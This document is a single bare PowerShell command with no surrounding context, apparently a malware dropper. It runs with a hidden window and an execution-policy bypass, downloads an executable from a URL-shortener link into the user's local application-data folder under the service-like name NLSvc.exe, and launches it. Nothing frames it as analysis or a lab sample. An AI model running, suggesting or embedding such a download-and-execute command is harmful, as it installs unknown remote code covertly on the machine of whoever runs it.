
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$url = 'https://is.gd/vvrLKd'; $filePath = Join-Path -Path $env:LOCALAPPDATA -ChildPath 'NLSvc.exe'; Invoke-WebRequest -Uri $url -OutFile $filePath; if ((Test-Path -Path $filePath) -and (-not (Get-Process -Name 'NLSvc' -ErrorAction SilentlyContinue))) { Start-Process -FilePath $filePath -Wait }"

